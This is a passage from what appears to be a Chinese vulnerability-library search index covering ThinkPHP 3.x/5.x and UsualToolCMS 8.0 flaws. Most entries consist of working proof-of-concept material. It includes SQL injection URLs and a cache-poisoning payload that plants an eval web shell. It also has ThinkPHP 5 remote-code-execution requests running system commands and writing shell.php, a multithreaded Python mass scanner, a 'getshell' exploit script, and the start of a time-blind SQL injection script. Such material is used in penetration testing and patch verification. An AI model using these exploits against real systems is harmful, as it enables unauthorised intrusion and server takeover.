3.2.3</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u4ea7\u751f\u6761\u4ef6","text":"<p>\u6b64\u7248\u672c\u9ed8\u8ba4\u7684\u7f13\u5b58\u5904\u7406\u673a\u5236\u4e2d\uff0c\u7f13\u5b58\u6587\u4ef6\u662f\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684.php\u6587\u4ef6\uff0c\u7f16\u7a0b\u4eba\u5458\u628a\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58\u5219\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_3","title":"\u83b7\u53d6\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58","text":"<p>\u4f8b\uff1a</p> <pre><code>&lt;?php\nnamespace Home\\Controller;\nuse Think\\Controller;\nclass IndexController extends Controller {\n\n    public function index(){\n        $a=I('post.a');\n        S('name',$a);\n    }\n}\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_4","title":"\u7528\u6237\u4f20\u53c2\u6570\uff1a","text":"<pre><code>?a=%0aeval($_POST['aaa']);%0a\n</code></pre> <p>%0a\u4e3a\u6362\u884c\u7b26\uff0c\u9ed8\u8ba4\u5b58\u5165\u7f13\u5b58\u6587\u4ef6\u65f6\u7528\u6237\u53c2\u6570\u5b58\u5728\u4e8e\u6ce8\u91ca\u4e2d\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#md5","title":"\u5199\u5165\u7f13\u5b58\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3amd5\u52a0\u5bc6","text":"<pre><code>md5(name)\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_5","title":"\u6587\u4ef6\u9ed8\u8ba4\u8def\u5f84","text":"<pre><code>&lt;domain&gt;/Application/Runtime/Temp/&lt;md5&gt;.php\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_6","title":"\u83dc\u5200\u8fde\u63a5","text":"<pre><code>http://xxxxxxx/Application/Runtime/Temp/&lt;md5&gt;.php \u5bc6\u7801aaa\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.0.(0-21)&5.1.(3-25)sql\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>5.0.0 &lt;= ThinkPHP &lt;= 5.0.21 5.1.3 &lt;= ThinkPHP &lt;= 5.1.25</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>5.0.0~5.0.21 \u3001 5.1.3\uff5e5.1.10</p> <pre><code>http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **\n</code></pre> <p>5.1.11\uff5e5.1.25</p> <pre><code>http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.0.(13-15)&5.1.(0-5) sql\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>5.0.13&lt;=ThinkPHP&lt;=5.0.15 5.1.0&lt;=ThinkPHP&lt;=5.1.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://*********/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.0.(7-22)&5.1.(0-30)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>5.0.7&lt;=ThinkPHP5&lt;=5.0.22 5.1.0&lt;=ThinkPHP&lt;=5.1.30</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>POC</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.0.10 sql\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>ThinkPHP=5.0.10</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Thinkphp 5.1.( 31)&5.0.( 23)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 thinkphp5\u6846\u67b6\u7f3a\u9677\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 2018-10-10 unknown http://www.thinkphp.cn/ \u4e0b\u8f7d\u8fde\u63a5 5.x &lt; 5.1.31, &lt;= 5.0.23 \u8be6\u60c5"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"poc","text":"<pre><code>http://192.168.99.98:7878/?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=1\nhttp://192.168.99.98:7878/?s=index/\\think\\Request/input&amp;filter=system&amp;data=id\nhttp://192.168.99.98:7878/?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E\nhttp://192.168.99.98:7878/?s=index/\\think\\view\\driver\\Php/display&amp;content=%3C?php%20phpinfo();?%3E\nhttp://192.168.99.98:7878/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nhttp://192.168.99.98:7878/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\nhttp://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\nhttp://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.1.(16-22) sql\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>5.1.16 &lt;= ThinkPHP &lt;= 5.1.22</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 5.1.(6-8) sql\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>5.1.6&lt;=ThinkPHP&lt;=5.1.7 \u975e\u6700\u65b0\u72485.1.8</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://********/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/","title":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#docker","title":"\u5b89\u88c5docker\u73af\u5883","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_1","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#vulhub","title":"\u4e0b\u8f7dvulhub\u9879\u76ee","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a</p> <pre><code>cd vunhub-master/thinkphp/5-rce\n</code></pre> <p>\u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a</p> <pre><code>docker-compose up -d\n</code></pre> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080** </p>","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_2","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","title":"Thinkphp5\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>5.0.0 &lt;= Thinkphp &lt;= 5.0.18 5.1.0 &lt;= ThinkPHP &lt;= 5.1.10</p>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://**********/index/index/index?cacheFile=1.jpg\n</code></pre>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/","title":"Thinkphp5\u547d\u4ee4\u6267\u884c\u6279\u91cf\u9a8c\u8bc1\u811a\u672c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/#thinkphp5","title":"thinkphp5\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/#poc","title":"POC\u68c0\u6d4b\u4ee3\u7801","text":"<pre><code># -*- coding:UTF-8 -*-\n# evn :python2\n\nimport requests\nimport threading\nimport time\nimport sys\n\nclass check(threading.Thread):            #\u5224\u65ad\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6267\u884c\u51fd\u6570\n    def __init__(self, url, sem):\n        super(check, self).__init__()     #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__()\n        self.url = url\n        self.sem = sem\n\n    def run(self):\n        parameters = \"s=index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\"\n\n        try:\n            responce = requests.get(url = self.url, params = parameters,timeout=3)\n            body = responce.text\n            if body.find('PHP Extension') != -1:\n                with open(\"success.txt\", \"a+\") as f1:\n                    f1.write(\"\u5b58\u5728tp5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e: \" + self.url + \"\\n\")\n                    print(\"[+] \" + self.url)\n            else:\n                print(\"[-] \" + self.url)\n        except Exception,err:\n            print(\"connect failed\")\n            pass\n        self.sem.release()             #\u6267\u884c\u5b8c\u51fd\u6570\uff0c\u91ca\u653e\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u6570\u52a01\n\nclass host(threading.Thread):          #\u904d\u5386\u6587\u4ef6\u64cd\u4f5c\n    def __init__(self, sem):\n        super(host, self).__init__()   #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__()\n        self.sem = sem\n\n    def run(self):\n        with open(\"url.txt\", \"r\") as f:\n            for host in f.readlines():\n                self.sem.acquire()     #\u904d\u5386\u4e00\u4e2a\u5c31\u83b7\u5f97\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u6700\u5927\n                host = host.strip()+\"/public/index.php\"\n                host_thread = check(host, self.sem)  \n                host_thread.start()    #\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570\n\nif __name__ == '__main__':\n    sem = threading.Semaphore(10)      #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a\n    thread = host(sem)                 #\u4f20\u9012sem\u503c\n    thread.start()\n</code></pre> <p>\u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./url.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/","title":"Thinkphp","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Thinkphp &lt;= 3.2.3</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC","text":"<pre><code>/index.php/home/user?money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp_5.0.x%E9%80%9A%E6%9D%80gethell/","title":"Thinkphp 5.0.x\u901a\u6740gethell","text":"<pre><code># thinkphp 5.0.* \u901a\u6740getshell poc_1\nimport requests\n\n\ndef post_command(host):\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n\n    data = {\n        \"_method\": \"__construct\",\n        \"filter[]\": \"system\",\n        \"method\": \"get\",\n        \"server[REQUEST_METHOD]\": \"echo 202cb962ac59075b964b07152d234b70 &gt; 11.php\"\n    }\n    target = host + \"/public/index.php?s=captcha\"\n    print(\"Request: {}\".format(target))\n    r = requests.post(target, data=data, headers=headers)\n    return True\n\n\n# \u9a8c\u8bc1 11.php\u662f\u5426\u5b58\u5728\ndef md5_file_is_exist(host):\n    rs = requests.get(host+\"/public/11.php\")\n    if rs.status_code == 200 and \"202cb962ac59075b964b07152d234b70\" in rs.text:\n        return True\n\n\nclass Exploit(object):\n\n    def attack(self, url):\n        post_command(url)\n        if md5_file_is_exist(url):\n            return \"getshell ok. {}\".format(url+\"/public/11.php\")\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","title":"UsualToolCMS 8.0 sql\u6ce8\u2f0a\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/#0x01","title":"0x01 \u6f0f\u6d1e\u73af\u5883","text":"<p>\u7248\u672c\u4fe1\u606f\uff1aUsualToolCMS-8.0-Release  \u7248\u672c\u4e0b\u8f7d\uff1ahttp://www.a5xiazai.com/php/140604.html  \u5b98\u7f51\u4e0b\u8f7d\uff1ahttps://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/#0x02","title":"0x02 \u6f0f\u6d1e\u5206\u6790","text":"<p>\u5728./cmsadmin/a_templetex.php\u6587\u4ef6\u7b2c137\u884c\uff0cpaths\u53d8\u91cf\u6ca1\u6709\u8fc7\u6ee4\uff0c136\u884c\u4eceget\u5904\u83b7\u53d6paths\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4: </p> <p>\u5f53\u4eceget\u5904\u83b7\u5f97\u7684t\u7b49\u4e8eopen\u65f6\u5c31\u53ef\u4ee5\u51fa\u53d1\u8fd9\u4e2asql\u6ce8\u5165\uff0c\u5728\u6587\u4ef6\u7b2c129\u884c: </p> <p>\u6784\u9020payload\uff1a</p> <pre><code>Copya_templetex.php?t=open&amp;id=1&amp;paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))&gt;0,sleep(5),1)--+\n</code></pre> <p></p> <p>\u7531\u4e8e\u662f\u65f6\u95f4\u76f2\u6ce8\uff0c\u7f16\u5199\u5ef6\u8fdf\u6ce8\u5165\u811a\u672c:</p> <pre><code>Copy# -*- coding:utf-8 -*-\nimport time\nimport requests\nsession = requests.session()\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'}\nimg_url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720'\nimg_req = session.get(url=img_url,headers=headers).content\nwith open('pic.png','wb') as f:\n    f.write(img_req)\ncode = input('\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801\uff1a')\ndata = {\n    'uuser':'admin',\n    'upass':'admin',\n    'ucode':code\n}\npayloads = 